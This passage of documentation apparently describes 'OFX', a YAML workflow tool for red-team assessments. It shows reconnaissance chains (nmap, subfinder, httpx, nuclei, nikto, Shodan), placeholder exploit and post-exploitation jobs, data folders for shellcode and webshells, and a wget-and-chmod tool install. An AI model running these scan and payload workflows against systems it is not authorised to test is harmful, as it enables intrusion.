Variables","text":""},{"location":"guide/templates/#inputs","title":"Inputs","text":"<p>Access workflow input parameters:</p> <pre><code>inputs:\n  target: example.com\n  ports: \"80,443\"\n\nsteps:\n  - run: nmap -p ${{ inputs.ports }} ${{ inputs.target }}\n</code></pre>"},{"location":"guide/templates/#secrets","title":"Secrets","text":"<p>Access sensitive configuration values:</p> <pre><code>steps:\n  - run: curl -H \"Authorization: Bearer ${{ secrets.API_KEY }}\" https://api.example.com\n</code></pre>"},{"location":"guide/templates/#context-variables","title":"Context Variables","text":"<p>Access execution context:</p> Variable Description Example <code>${{ ctx.run_id }}</code> Unique run identifier <code>20231225_143022_abc123</code> <code>${{ ctx.output_path }}</code> Output directory path <code>/tmp/ofx/output/run_id</code> <code>${{ ctx.workflow_dir }}</code> Workflow file directory <code>/path/to/workflows</code> <pre><code>steps:\n  - run: cp results.txt ${{ ctx.output_path }}/results_${{ ctx.run_id }}.txt\n</code></pre>"},{"location":"guide/templates/#built-in-functions","title":"Built-in Functions","text":""},{"location":"guide/templates/#tool-installation","title":"Tool Installation","text":""},{"location":"guide/templates/#uv_install","title":"uv_install","text":"<p>Install Python packages with uv:</p> <pre><code>steps:\n  - run: ${{ uv_install('requests beautifulsoup4') }}\n  - script: |\n      import requests\n      response = requests.get('https://example.com')\n</code></pre>"},{"location":"guide/templates/#pip_install","title":"pip_install","text":"<p>Install Python packages with pip:</p> <pre><code>steps:\n  - run: ${{ pip_install('scapy nmap') }}\n</code></pre>"},{"location":"guide/templates/#go_install","title":"go_install","text":"<p>Install Go packages:</p> <pre><code>steps:\n  - run: ${{ go_install('github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest') }}\n  - run: ${{ tools_bin_dir }}/nuclei -version\n</code></pre>"},{"location":"guide/templates/#cargo_install","title":"cargo_install","text":"<p>Install Rust packages:</p> <pre><code>steps:\n  - run: ${{ cargo_install('ripgrep') }}\n  - run: ${{ tools_bin_dir }}/rg --version\n</code></pre>"},{"location":"guide/templates/#npm_install","title":"npm_install","text":"<p>Install Node.js packages globally:</p> <pre><code>steps:\n  - run: ${{ npm_install('http-server') }}\n  - run: ${{ tools_bin_dir }}/http-server\n</code></pre>"},{"location":"guide/templates/#tool-directories","title":"Tool Directories","text":""},{"location":"guide/templates/#tools_dir","title":"tools_dir","text":"<p>Base directory for installed tools:</p> <pre><code>steps:\n  - run: ls -la ${{ tools_dir }}\n  # Output: /home/user/.ofx/tools\n</code></pre>"},{"location":"guide/templates/#tools_bin_dir","title":"tools_bin_dir","text":"<p>Binary directory for installed tools:</p> <pre><code>steps:\n  - run: export PATH=${{ tools_bin_dir }}:$PATH\n  - run: nuclei -version\n</code></pre>"},{"location":"guide/templates/#custom-tool-installation","title":"Custom Tool Installation","text":""},{"location":"guide/templates/#install_tool","title":"install_tool","text":"<p>Install tool with custom command:</p> <pre><code>steps:\n  - run: ${{ install_tool('tool_name', 'wget https://example.com/tool &amp;&amp; chmod +x tool') }}\n</code></pre>"},{"location":"guide/templates/#template-examples","title":"Template Examples","text":""},{"location":"guide/templates/#dynamic-port-scanning","title":"Dynamic Port Scanning","text":"<pre><code>inputs:\n  target:\n    required: true\n  ports:\n    default: \"80,443,8080\"\n  scan_type:\n    default: \"syn\"\n\nsteps:\n  - name: Scan ports\n    run: nmap -p${{ inputs.ports }} -s${{ inputs.scan_type }} ${{ inputs.target }}\n\n  - name: Save results\n    run: mv scan.xml ${{ ctx.output_path }}/scan_${{ ctx.run_id }}.xml\n</code></pre>"},{"location":"guide/templates/#conditional-execution","title":"Conditional Execution","text":"<pre><code>inputs:\n  mode:\n    default: \"standard\"\n\nsteps:\n  - name: Quick scan\n    run: nmap -F ${{ inputs.target }}\n    # Use shell conditionals for complex logic\n\n  - name: Full scan\n    script: |\n      if [ \"${{ inputs.mode }}\" = \"aggressive\" ]; then\n        nmap -p- -T4 ${{ inputs.target }}\n      else\n        nmap -T3 ${{ inputs.target }}\n      fi\n    language: shell\n</code></pre>"},{"location":"guide/templates/#api-integration","title":"API Integration","text":"<pre><code>secrets:\n  SHODAN_API_KEY:\n    required: true\n\nsteps:\n  - name: Query Shodan\n    script: |\n      import requests\n\n      api_key = '${{ secrets.SHODAN_API_KEY }}'\n      target = '${{ inputs.target }}'\n\n      response = requests.get(\n        f'https://api.shodan.io/shodan/host/{target}',\n        params={'key': api_key}\n      )\n\n      print(response.json())\n</code></pre>"},{"location":"guide/templates/#tool-installation-and-usage","title":"Tool Installation and Usage","text":"<pre><code>steps:\n  - name: Install scanning tools\n    run: |\n      ${{ go_install('github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest') }}\n      ${{ go_install('github.com/projectdiscovery/httpx/cmd/httpx@latest') }}\n      ${{ uv_install('python-nmap') }}\n\n  - name: Run subdomain enumeration\n    run: ${{ tools_bin_dir }}/subfinder -d ${{ inputs.target }} -o ${{ ctx.output_path }}/subdomains.txt\n\n  - name: Probe HTTP services\n    run: cat ${{ ctx.output_path }}/subdomains.txt | ${{ tools_bin_dir }}/httpx -o ${{ ctx.output_path }}/http.txt\n</code></pre>"},{"location":"guide/templates/#file-path-management","title":"File Path Management","text":"<pre><code>steps:\n  - name: Create directory structure\n    run: |\n      mkdir -p ${{ ctx.output_path }}/scans\n      mkdir -p ${{ ctx.output_path }}/reports\n      mkdir -p ${{ ctx.output_path }}/logs\n\n  - name: Run scan\n    run: nmap ${{ inputs.target }} -oX ${{ ctx.output_path }}/scans/nmap_${{ ctx.run_id }}.xml\n\n  - name: Generate report\n    script: |\n      import xml.etree.ElementTree as ET\n      import json\n\n      tree = ET.parse('${{ ctx.output_path }}/scans/nmap_${{ ctx.run_id }}.xml')\n      # Process XML...\n\n      with open('${{ ctx.output_path }}/reports/report_${{ ctx.run_id }}.json', 'w') as f:\n        json.dump(report_data, f)\n</code></pre>"},{"location":"guide/templates/#environment-configuration","title":"Environment Configuration","text":"<pre><code>envs:\n  LOG_LEVEL: INFO\n  TIMEOUT: \"300\"\n\nsteps:\n  - name: Configure environment\n    run: |\n      export LOG_LEVEL=${{ env.LOG_LEVEL }}\n      export TIMEOUT=${{ env.TIMEOUT }}\n      python scanner.py --target ${{ inputs.target }}\n</code></pre>"},{"location":"guide/templates/#advanced-templates","title":"Advanced Templates","text":""},{"location":"guide/templates/#nested-templates","title":"Nested Templates","text":"<pre><code>steps:\n  - name: Complex command\n    run: |\n      ${{ uv_install('requests') }}\n      python -c \"\n      import requests\n      r = requests.get('https://${{ inputs.target }}')\n      with open('${{ ctx.output_path }}/response_${{ ctx.run_id }}.txt', 'w') as f:\n        f.write(r.text)\n      \"\n</code></pre>"},{"location":"guide/templates/#template-in-python-scripts","title":"Template in Python Scripts","text":"<pre><code>steps:\n  - name: Python with templates\n    script: |\n      import os\n      import json\n      from pathlib import Path\n\n      # Access template variables\n      target = '${{ inputs.target }}'\n      output_path = Path('${{ ctx.output_path }}')\n      run_id = '${{ ctx.run_id }}'\n\n      # Create structured output\n      result_file = output_path / f'scan_{run_id}.json'\n\n      data = {\n        'target': target,\n        'timestamp': run_id,\n        'results': perform_scan(target)\n      }\n\n      with open(result_file, 'w') as f:\n        json.dump(data, f, indent=2)\n</code></pre>"},{"location":"guide/templates/#template-in-shell-scripts","title":"Template in Shell Scripts","text":"<pre><code>steps:\n  - name: Bash with templates\n    script: |\n      #!/bin/bash\n\n      TARGET=\"${{ inputs.target }}\"\n      OUTPUT_DIR=\"${{ ctx.output_path }}\"\n      RUN_ID=\"${{ ctx.run_id }}\"\n\n      echo \"Scanning $TARGET...\"\n\n      # Run scan\n      nmap -sV \"$TARGET\" -oN \"$OUTPUT_DIR/scan_$RUN_ID.txt\"\n\n      # Process results\n      grep \"open\" \"$OUTPUT_DIR/scan_$RUN_ID.txt\" &gt; \"$OUTPUT_DIR/open_ports_$RUN_ID.txt\"\n    language: bash\n</code></pre>"},{"location":"guide/templates/#template-best-practices","title":"Template Best Practices","text":""},{"location":"guide/templates/#1-quote-template-values-in-shell","title":"1. Quote Template Values in Shell","text":"<pre><code># Good - Quoted for safety\n- run: nmap -p \"${{ inputs.ports }}\" \"${{ inputs.target }}\"\n\n# Bad - May break with spaces or special chars\n- run: nmap -p ${{ inputs.ports }} ${{ inputs.target }}\n</code></pre>"},{"location":"guide/templates/#2-validate-template-values","title":"2. Validate Template Values","text":"<pre><code>steps:\n  - name: Validate input\n    script: |\n      import re\n\n      target = '${{ inputs.target }}'\n\n      # Validate format\n      if not re.match(r'^[a-zA-Z0-9.-]+$', target):\n        print(f\"Invalid target format: {target}\")\n        sys.exit(1)\n</code></pre>"},{"location":"guide/templates/#3-use-meaningful-names","title":"3. Use Meaningful Names","text":"<pre><code>inputs:\n  # Good - Clear purpose\n  target_hostname:\n    description: Target server hostname\n\n  scan_timeout_seconds:\n    description: Maximum scan duration in seconds\n\n  # Bad - Unclear\n  t:\n    description: target\n\n  timeout:\n    description: timeout\n</code></pre>"},{"location":"guide/templates/#4-provide-defaults","title":"4. Provide Defaults","text":"<pre><code>inputs:\n  target:\n    required: true\n    # No default - must be provided\n\n  ports:\n    required: false\n    default: \"80,443,8080\"\n    # Default provided\n\n  scan_speed:\n    required: false\n    default: \"normal\"\n    # Default for optional parameter\n</code></pre>"},{"location":"guide/templates/#5-document-template-usage","title":"5. Document Template Usage","text":"<pre><code># Document what each template variable represents\ninputs:\n  api_endpoint:\n    description: \"API endpoint URL (e.g., https://api.example.com)\"\n    required: true\n\n  rate_limit:\n    description: \"Maximum requests per second (1-100)\"\n    default: \"10\"\n\nsteps:\n  - name: Call API with rate limiting\n    # Template variables:\n    # - api_endpoint: Base URL for API calls\n    # - rate_limit: Throttle requests\n    run: python api_client.py --url \"${{ inputs.api_endpoint }}\" --rate ${{ inputs.rate_limit }}\n</code></pre>"},{"location":"guide/templates/#troubleshooting-templates","title":"Troubleshooting Templates","text":""},{"location":"guide/templates/#template-not-resolving","title":"Template Not Resolving","text":"<pre><code># Check for typos\n${{ inputs.traget }}  # Wrong: traget\n${{ inputs.target }}  # Correct: target\n\n# Check for undefined variables\n${{ inputs.nonexistent }}  # Error: nonexistent not defined\n\n# Verify input is declared\ninputs:\n  target:  # Must be declared\n    required: true\n</code></pre>"},{"location":"guide/templates/#shell-escaping-issues","title":"Shell Escaping Issues","text":"<pre><code># Problem: Special characters\n- run: echo ${{ inputs.message }}  # Breaks if message contains quotes\n\n# Solution: Proper quoting\n- run: echo \"${{ inputs.message }}\"\n\n# Alternative: Use script block\n- script: |\n    message=\"${{ inputs.message }}\"\n    echo \"$message\"\n  language: bash\n</code></pre>"},{"location":"guide/templates/#path-issues","title":"Path Issues","text":"<pre><code># Problem: Relative paths\n- run: cp file.txt output/  # Where is output/?\n\n# Solution: Use ctx.output_path\n- run: cp file.txt ${{ ctx.output_path }}/\n\n# Problem: Path with spaces\n- run: cd /path with spaces/  # Breaks\n\n# Solution: Quote the path\n- run: cd \"${{ ctx.output_path }}/\"\n</code></pre>"},{"location":"guide/templates/#template-reference","title":"Template Reference","text":""},{"location":"guide/templates/#complete-variable-list","title":"Complete Variable List","text":"<pre><code># Inputs\n${{ inputs.variable_name }}\n\n# Secrets\n${{ secrets.secret_name }}\n\n# Context\n${{ ctx.run_id }}           # Unique run identifier\n${{ ctx.output_path }}      # Output directory path\n${{ ctx.workflow_dir }}     # Workflow directory\n\n# Environment\n${{ env.VARIABLE_NAME }}    # Environment variables\n\n# Tool Functions\n${{ uv_install('package') }}           # Install Python package with uv\n${{ pip_install('package') }}          # Install Python package with pip\n${{ go_install('package@version') }}   # Install Go package\n${{ cargo_install('package') }}        # Install Rust package\n${{ npm_install('package') }}          # Install Node package\n\n# Tool Paths\n${{ tools_dir }}            # Tool installation directory\n${{ tools_bin_dir }}        # Tool binary directory\n</code></pre>"},{"location":"guide/templates/#see-also","title":"See Also","text":"<ul> <li>Workflows - Workflow configuration</li> <li>Jobs &amp; Steps - Using templates in jobs and steps</li> <li>Secrets &amp; Inputs - Managing inputs and secrets</li> </ul>"},{"location":"guide/workflows/","title":"Workflows","text":"<p>Workflows are the top-level execution containers in OFX. They define the complete execution flow including jobs, dependencies, inputs, secrets, and lifecycle hooks.</p>"},{"location":"guide/workflows/#basic-structure","title":"Basic Structure","text":"<pre><code>name: My Workflow\ndescription: Optional workflow description\n\ninputs:\n  target:\n    description: Target hostname or IP\n    required: true\n    default: localhost\n\nsecrets:\n  API_KEY:\n    description: API key for external services\n    required: false\n\njobs:\n  reconnaissance:\n    steps:\n      - name: Scan ports\n        run: nmap -sV ${{ inputs.target }}\n\n  analysis:\n    needs: [reconnaissance]\n    steps:\n      - name: Analyze results\n        run: python analyze.py\n</code></pre>"},{"location":"guide/workflows/#workflow-properties","title":"Workflow Properties","text":""},{"location":"guide/workflows/#name-required","title":"name (required)","text":"<p>Human-readable workflow name.</p> <pre><code>name: Red Team Assessment\n</code></pre>"},{"location":"guide/workflows/#description-optional","title":"description (optional)","text":"<p>Detailed description of what the workflow does.</p> <pre><code>description: Automated reconnaissance and vulnerability assessment workflow\n</code></pre>"},{"location":"guide/workflows/#inputs-optional","title":"inputs (optional)","text":"<p>Define input parameters that can be provided at runtime.</p> <pre><code>inputs:\n  target:\n    description: Target hostname or IP address\n    required: true\n    default: example.com\n\n  ports:\n    description: Ports to scan\n    required: false\n    default: \"80,443,8080\"\n</code></pre> <p>Access inputs in commands using <code>${{ inputs.name }}</code>:</p> <pre><code>run: nmap -p ${{ inputs.ports }} ${{ inputs.target }}\n</code></pre>"},{"location":"guide/workflows/#secrets-optional","title":"secrets (optional)","text":"<p>Define sensitive configuration values.</p> <pre><code>secrets:\n  API_KEY:\n    description: API key for Shodan\n    required: true\n\n  API_SECRET:\n    description: API secret\n    required: false\n</code></pre> <p>Access secrets using <code>${{ secrets.name }}</code>:</p> <pre><code>run: python scan.py --api-key ${{ secrets.API_KEY }}\n</code></pre>"},{"location":"guide/workflows/#envs-optional","title":"envs (optional)","text":"<p>Define environment variables for the entire workflow.</p> <pre><code>envs:\n  LOG_LEVEL: DEBUG\n  OUTPUT_DIR: /tmp/results\n</code></pre>"},{"location":"guide/workflows/#jobs-required","title":"jobs (required)","text":"<p>Map of job definitions. See Jobs &amp; Steps for details.</p>"},{"location":"guide/workflows/#running-workflows","title":"Running Workflows","text":""},{"location":"guide/workflows/#from-command-line","title":"From Command Line","text":"<pre><code># Basic execution\nofx flow run workflow.yml\n\n# With inputs\nofx flow run workflow.yml --input target=192.168.1.1 --input ports=80,443\n\n# With secrets\nofx flow run workflow.yml --secret API_KEY=your_key_here\n\n# With environment variables\nofx flow run workflow.yml --env LOG_LEVEL=DEBUG\n</code></pre>"},{"location":"guide/workflows/#from-python","title":"From Python","text":"<pre><code>import asyncio\nfrom pathlib import Path\nfrom ofx.runner import WorkflowRunner, RunContext\nfrom ofx.models.workflow import Workflow\nimport yaml\n\nasync def run_workflow():\n    # Load workflow\n    with open(\"workflow.yml\") as f:\n        workflow_data = yaml.safe_load(f)\n\n    workflow = Workflow(**workflow_data)\n\n    # Create context\n    ctx = RunContext(\n        inputs={\"target\": \"192.168.1.1\"},\n        secrets={\"API_KEY\": \"your_key\"},\n        output_path=Path(\"./output\"),\n    )\n\n    # Run workflow\n    runner = WorkflowRunner(workflow, ctx)\n    result = await runner.run()\n\n    print(f\"Status: {result.status}\")\n    print(f\"Output: {result.output}\")\n\nasyncio.run(run_workflow())\n</code></pre>"},{"location":"guide/workflows/#workflow-validation","title":"Workflow Validation","text":"<p>Validate workflow syntax before running:</p> <pre><code>ofx flow validate workflow.yml\n</code></pre> <p>This checks: - YAML syntax - Required fields - Job dependencies - Input/secret references</p>"},{"location":"guide/workflows/#workflow-dependencies","title":"Workflow Dependencies","text":"<p>Jobs can depend on other jobs using the <code>needs</code> field:</p> <pre><code>jobs:\n  scan:\n    steps:\n      - name: Port scan\n        run: nmap -sV ${{ inputs.target }}\n\n  analyze:\n    needs: [scan]  # Waits for scan to complete\n    steps:\n      - name: Analyze results\n        run: python analyze.py\n\n  report:\n    needs: [analyze]  # Waits for analyze to complete\n    steps:\n      - name: Generate report\n        run: python report.py\n</code></pre>"},{"location":"guide/workflows/#parallel-execution","title":"Parallel Execution","text":"<p>Jobs without dependencies run in parallel:</p> <pre><code>jobs:\n  scan_http:\n    steps:\n      - run: nikto -h ${{ inputs.target }}\n\n  scan_ssl:\n    steps:\n      - run: sslscan ${{ inputs.target }}\n\n  # Both scan_http and scan_ssl run simultaneously\n</code></pre>"},{"location":"guide/workflows/#multiple-dependencies","title":"Multiple Dependencies","text":"<p>Jobs can depend on multiple other jobs:</p> <pre><code>jobs:\n  port_scan:\n    steps:\n      - run: nmap ${{ inputs.target }}\n\n  dns_enum:\n    steps:\n      - run: dnsrecon -d ${{ inputs.target }}\n\n  exploit:\n    needs: [port_scan, dns_enum]  # Waits for both to complete\n    steps:\n      - run: python exploit.py\n</code></pre>"},{"location":"guide/workflows/#workflow-hooks","title":"Workflow Hooks","text":"<p>Add hooks to execute custom code at various lifecycle points:</p> <pre><code>name: Workflow with Hooks\n\nhooks:\n  on_start:\n    script: |\n      print(f\"Starting workflow at {datetime.now()}\")\n      print(f\"Target: {ctx.inputs['target']}\")\n    script:\n\n  on_success:\n    script: echo \"Workflow completed successfully!\"\n    language: shell\n\n  on_error:\n    script: |\n      import sys\n      print(f\"Error occurred: {error}\", file=sys.stderr)\n    script:\n\njobs:\n  # ... job definitions\n</code></pre> <p>See Hooks System for complete documentation.</p>"},{"location":"guide/workflows/#template-variables","title":"Template Variables","text":"<p>Workflows support Jinja2 templates with <code>${{ }}</code> syntax:</p> <pre><code>jobs:\n  scan:\n    steps:\n      - name: Scan target\n        run: nmap -p ${{ inputs.ports }} ${{ inputs.target }}\n\n      - name: Save results\n        run: cp results.txt ${{ ctx.output_path }}/scan_${{ ctx.run_id }}.txt\n</code></pre> <p>Available template variables: - <code>${{ inputs.name }}</code> - Input values - <code>${{ secrets.name }}</code> - Secret values - <code>${{ ctx.output_path }}</code> - Output directory path - <code>${{ ctx.run_id }}</code> - Unique run identifier - <code>${{ tools_dir }}</code> - Tool installation directory - <code>${{ tools_bin_dir }}</code> - Tool binaries directory</p> <p>See Templates for more details.</p>"},{"location":"guide/workflows/#output-management","title":"Output Management","text":"<p>Workflows automatically create output directories:</p> <pre><code>jobs:\n  scan:\n    steps:\n      - name: Save scan results\n        run: nmap ${{ inputs.target }} -oX ${{ ctx.output_path }}/scan.xml\n</code></pre> <p>Output structure: <pre><code>output/\n\u2514\u2500\u2500 &lt;run_id&gt;/\n    \u2514\u2500\u2500 scan.xml\n</code></pre></p>"},{"location":"guide/workflows/#error-handling","title":"Error Handling","text":""},{"location":"guide/workflows/#continue-on-error","title":"Continue on Error","text":"<p>By default, workflows stop on first error. Continue execution:</p> <pre><code>jobs:\n  scan:\n    continue_on_error: true\n    steps:\n      - run: nmap ${{ inputs.target }}\n</code></pre>"},{"location":"guide/workflows/#retry-logic","title":"Retry Logic","text":"<p>Steps can be retried on failure:</p> <pre><code>jobs:\n  api_call:\n    steps:\n      - name: Call API\n        run: curl https://api.example.com\n        retry: 3\n        retry_delay: 5  # seconds\n</code></pre>"},{"location":"guide/workflows/#best-practices","title":"Best Practices","text":""},{"location":"guide/workflows/#1-use-descriptive-names","title":"1. Use Descriptive Names","text":"<pre><code>name: \"Production Environment Security Scan\"\ndescription: \"Comprehensive security assessment including port scanning, vulnerability detection, and configuration review\"\n</code></pre>"},{"location":"guide/workflows/#2-document-inputs","title":"2. Document Inputs","text":"<pre><code>inputs:\n  target:\n    description: \"Target hostname or IP address (e.g., example.com or 192.168.1.1)\"\n    required: true\n\n  scan_type:\n    description: \"Scan type: quick, standard, or comprehensive\"\n    required: false\n    default: \"standard\"\n</code></pre>"},{"location":"guide/workflows/#3-validate-inputs","title":"3. Validate Inputs","text":"<pre><code>jobs:\n  validate:\n    steps:\n      - name: Check target format\n        run: |\n          if [[ ! \"${{ inputs.target }}\" =~ ^[a-zA-Z0-9.-]+$ ]]; then\n            echo \"Invalid target format\"\n            exit 1\n          fi\n</code></pre>"},{"location":"guide/workflows/#4-use-meaningful-job-names","title":"4. Use Meaningful Job Names","text":"<pre><code>jobs:\n  network_reconnaissance:\n    # Clear what this job does\n\n  vulnerability_assessment:\n    # Clear purpose\n\n  post_exploitation:\n    # Clear phase\n</code></pre>"},{"location":"guide/workflows/#5-organize-complex-workflows","title":"5. Organize Complex Workflows","text":"<p>Break large workflows into smaller, reusable workflows:</p> <pre><code># main_workflow.yml\njobs:\n  reconnaissance:\n    workflow: ./recon_workflow.yml\n\n  exploitation:\n    needs: [reconnaissance]\n    workflow: ./exploit_workflow.yml\n</code></pre>"},{"location":"guide/workflows/#examples","title":"Examples","text":""},{"location":"guide/workflows/#simple-scan-workflow","title":"Simple Scan Workflow","text":"<pre><code>name: Simple Port Scan\n\ninputs:\n  target:\n    description: Target host\n    required: true\n\njobs:\n  scan:\n    steps:\n      - name: TCP SYN scan\n        run: nmap -sS ${{ inputs.target }}\n\n      - name: Service detection\n        run: nmap -sV ${{ inputs.target }}\n</code></pre>"},{"location":"guide/workflows/#complex-assessment-workflow","title":"Complex Assessment Workflow","text":"<pre><code>name: Comprehensive Security Assessment\n\ninputs:\n  target:\n    description: Target network or host\n    required: true\n\n  depth:\n    description: Assessment depth (1-5)\n    required: false\n    default: \"3\"\n\nsecrets:\n  SHODAN_KEY:\n    description: Shodan API key\n    required: false\n\nhooks:\n  on_start:\n    script: echo \"Starting assessment of ${{ inputs.target }}\"\n    language: shell\n\n  on_success:\n    script: python notify_team.py --status success\n    language: shell\n\njobs:\n  passive_recon:\n    steps:\n      - name: OSINT gathering\n        run: python osint.py --target ${{ inputs.target }}\n\n      - name: Shodan lookup\n        run: |\n          if [ -n \"${{ secrets.SHODAN_KEY }}\" ]; then\n            shodan host ${{ inputs.target }}\n          fi\n\n  active_scan:\n    needs: [passive_recon]\n    steps:\n      - name: Port scan\n        run: nmap -sS -sV -p- ${{ inputs.target }}\n\n      - name: Vulnerability scan\n        run: nmap --script vuln ${{ inputs.target }}\n\n  analysis:\n    needs: [active_scan]\n    steps:\n      - name: Analyze results\n        run: python analyze.py --input ${{ ctx.output_path }}/scan.xml\n\n      - name: Generate report\n        run: python report.py --output ${{ ctx.output_path }}/report.pdf\n</code></pre>"},{"location":"guide/workflows/#see-also","title":"See Also","text":"<ul> <li>Jobs &amp; Steps - Detailed job and step configuration</li> <li>Hooks System - Lifecycle hooks</li> <li>Templates - Template syntax and functions</li> <li>Secrets &amp; Inputs - Managing secrets and inputs</li> </ul>"},{"location":"guide/extending-data-modules/","title":"Extending Data Modules","text":"<p>Overview of how to extend and customize data modules in OFX.</p> <ul> <li>Custom Connectors</li> <li>Data Directory Structure</li> </ul>"},{"location":"guide/extending-data-modules/custom-connectors/","title":"Custom Connectors","text":"<p>Custom connectors allow you to extend OFX with your own data sources, APIs, or integrations. Use them to add new asset types, fetch data from external systems, or enrich workflow context.</p>"},{"location":"guide/extending-data-modules/custom-connectors/#why-use-custom-connectors","title":"Why Use Custom Connectors?","text":"<ul> <li>Integrate with internal asset inventories or ticketing systems</li> <li>Pull data from third-party APIs</li> <li>Normalize and enrich workflow inputs</li> </ul>"},{"location":"guide/extending-data-modules/custom-connectors/#how-to-implement","title":"How to Implement","text":"<ol> <li>Create a new Python module in <code>src/ofx/api/connectors/</code> (or similar)</li> <li>Define a class with methods for fetching or transforming data</li> <li>Register your connector in the workflow or as a step</li> </ol>"},{"location":"guide/extending-data-modules/custom-connectors/#example-custom-asset-fetcher","title":"Example: Custom Asset Fetcher","text":"<pre><code># src/ofx/api/connectors/myassets.py\nclass MyAssetConnector:\n        def fetch_assets(self, query):\n                # Connect to internal API\n                ...\n                return [\"host1\", \"host2\"]\n</code></pre> <p>YAML usage: <pre><code>steps:\n    - name: Fetch Assets\n        run: |\n            from ofx.api.connectors.myassets import MyAssetConnector\n            assets = MyAssetConnector().fetch_assets(\"prod\")\n            for host in assets:\n                    print(host)\n        script:\n        outputs:\n            hosts: \"{{ step.stdout_lines }}\"\n</code></pre></p>"},{"location":"guide/extending-data-modules/custom-connectors/#best-practices","title":"Best Practices","text":"<ul> <li>Keep connector logic modular and reusable</li> <li>Handle API errors and timeouts gracefully</li> <li>Document required environment variables or secrets</li> </ul>"},{"location":"guide/extending-data-modules/custom-connectors/#see-also","title":"See Also","text":"<ul> <li>Data Directory</li> </ul>"},{"location":"guide/extending-data-modules/data-directory/","title":"Data Directory Structure","text":"<p>The data directory in OFX stores reusable assets, payloads, templates, and other resources used by workflows and custom connectors.</p>"},{"location":"guide/extending-data-modules/data-directory/#structure","title":"Structure","text":"<p>Typical layout: <pre><code>src/ofx/data/\n    shellcode/\n    site/\n    webshell/\n    ...\n</code></pre></p>"},{"location":"guide/extending-data-modules/data-directory/#how-to-use","title":"How to Use","text":"<ul> <li>Reference files in the data directory from workflow steps</li> <li>Use in custom connectors to load payloads or templates</li> </ul>"},{"location":"guide/extending-data-modules/data-directory/#example-using-a-payload","title":"Example: Using a Payload","text":"<pre><code>steps:\n    - name: Use Payload\n        run: |\n            with open('src/ofx/data/shellcode/payload.bin', 'rb') as f:\n                    data = f.read()\n            # Use data in exploit\n        script:\n</code></pre>"},{"location":"guide/extending-data-modules/data-directory/#best-practices","title":"Best Practices","text":"<ul> <li>Organize data by type (e.g., shellcode, webshells)</li> <li>Document the purpose of each file</li> <li>Avoid storing secrets in the data directory</li> </ul>"},{"location":"guide/extending-data-modules/data-directory/#see-also","title":"See Also","text":"<ul> <li>Custom Connectors</li> </ul>"},{"location":"guide/hooks/","title":"Hooks Guide","text":"<p>Overview of hooks in OFX workflows.</p> <ul> <li>Lifecycle</li> <li>Examples</li> </ul>"},{"location":"guide/hooks/examples/","title":"Hook Examples","text":"<p>Hooks let you run custom code at key points in your workflow, job, or step lifecycle. Here are practical examples for common use cases.</p>"},{"location":"guide/hooks/examples/#example-1-workflow-start-notification","title":"Example 1: Workflow Start Notification","text":"<pre><code>hooks:\n    on_start:\n        run: echo \"Workflow started at $(date)\"\n        language: shell\n</code></pre>"},{"location":"guide/hooks/examples/#example-2-job-failure-alert","title":"Example 2: Job Failure Alert","text":"<pre><code>jobs:\n    exploit:\n        hooks:\n            on_failure:\n                run: |\n                    import requests\n                    requests.post(\"https://alerts.local/webhook\", json={\"status\": \"fail\"})\n                script:\n        steps:\n            - run: python exploit.py\n</code></pre>"},{"location":"guide/hooks/examples/#example-3-step-output-processing","title":"Example 3: Step Output Processing","text":"<pre><code>steps:\n    - run: nmap {{ inputs.target }}\n        hooks:\n            on_line:\n                run: print(\"Line:\", line)\n                script:\n</code></pre>"},{"location":"guide/hooks/examples/#example-4-cleanup-on-end","title":"Example 4: Cleanup on End","text":"<pre><code>hooks:\n    on_end:\n        run: rm -rf /tmp/ofx*\n        language: shell\n</code></pre>"},{"location":"guide/hooks/examples/#see-also","title":"See Also","text":"<ul> <li>Hooks Guide</li> </ul>"},{"location":"guide/hooks/lifecycle/","title":"Hook Lifecycle","text":"<p>Hooks in OFX can be defined at the workflow, job, or step level. They execute in a specific order, allowing you to customize behavior at every stage.</p>"},{"location":"guide/hooks/lifecycle/#hook-levels","title":"Hook Levels","text":"<ul> <li>Step-level: Runs first, specific to a step</li> <li>Job-level: Runs if not overridden by step</li> <li>Workflow-level: Runs if not overridden by job or step</li> </ul>"},{"location":"guide/hooks/lifecycle/#execution-order","title":"Execution Order","text":"<ol> <li>Step-level hooks (if present)</li> <li>Job-level hooks (if present and not overridden)</li> <li>Workflow-level hooks (if present and not overridden)</li> </ol>"},{"location":"guide/hooks/lifecycle/#available-hook-events","title":"Available Hook Events","text":"<ul> <li><code>on_start</code>: Before execution</li> <li><code>on_success</code>: On successful completion</li> <li><code>on_failure</code>: On failure</li> <li><code>on_error</code>: On error</li> <li><code>on_end</code>: After all steps/jobs</li> <li><code>on_line</code>: For each output line (steps only)</li> <li><code>before_run</code>, <code>after_run</code>: Advanced, for custom runners</li> </ul>"},{"location":"guide/hooks/lifecycle/#example-step-and-job-hooks","title":"Example: Step and Job Hooks","text":"<pre><code>jobs:\n    scan:\n        hooks:\n            on_start:\n                run: echo \"Job started\"\n                language: shell\n        steps:\n            - run: nmap {{ inputs.target }}\n                hooks:\n                    on_success:\n                        run: echo \"Step succeeded\"\n                        language: shell\n</code></pre>"},{"location":"guide/hooks/lifecycle/#see-also","title":"See Also","text":"<ul> <li>Hooks Guide</li> </ul>"},{"location":"guide/interactive-mode/","title":"Interactive Mode (Overview)","text":"<p>OFX supports interactive mode for steps, allowing stdin/stdout passthrough for interactive commands like shells, REPLs, or tools that require user input.</p> <ul> <li>Usage</li> <li>Detection &amp; Execution</li> <li>Limitations</li> <li>Examples</li> <li>Best Practices</li> <li>Error Handling &amp; Troubleshooting</li> </ul> <p>Interactive mode is automatically enabled when: 1. A step has <code>interactive: true</code> flag set 2. The job containing the step is alone in its execution stage (no parallel jobs)</p> <p>This prevents conflicts from multiple jobs trying to use stdin/stdout simultaneously.</p> <p>See the subpages for details, YAML examples, and troubleshooting.</p>"},{"location":"guide/interactive-mode/best-practices/","title":"Best Practices for Interactive Mode","text":""},{"location":"guide/interactive-mode/best-practices/#set-appropriate-timeouts","title":"Set Appropriate Timeouts","text":"<p>Always set timeouts for interactive sessions to prevent hanging: <pre><code>- name: Interactive Session\n  run: bash\n  interactive: true\n  timeout: 15  # 15 minutes timeout\n</code></pre></p>"},{"location":"guide/interactive-mode/best-practices/#use-for-debugging","title":"Use for Debugging","text":"<p>Interactive mode is perfect for debugging workflow issues: <pre><code>jobs:\n  debug:\n    steps:\n      - name: Run Commands\n        run: |\n          ./setup.sh\n          ./process.sh\n      - name: Debug Session\n        run: bash\n        interactive: true\n        